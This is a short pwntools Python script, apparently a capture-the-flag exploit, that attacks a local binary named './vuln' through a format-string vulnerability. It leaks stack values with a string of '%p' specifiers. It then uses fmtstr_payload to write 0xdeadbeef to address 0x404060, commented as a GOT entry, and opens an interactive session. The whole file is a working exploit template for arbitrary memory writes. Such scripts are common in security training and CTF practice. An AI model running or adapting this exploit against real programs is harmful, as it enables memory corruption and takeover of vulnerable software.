#!/usr/bin/env python3
from pwn import *

context.update(arch='amd64', os='linux', log_level='debug')

def exploit():
    p = process('./vuln')
    
    # Find offset
    p.sendline(b'AAAA %p %p %p %p %p %p %p %p %p %p')
    leak = p.recv()
    log.info(f"Leak: {leak}")
    
    # Build format string payload
    target_addr = 0x404060  # GOT entry or target variable
    write_value = 0xdeadbeef
    
    payload = fmtstr_payload(6, {target_addr: write_value})
    p.sendline(payload)
    
    p.interactive()

if __name__ == '__main__':
    exploit()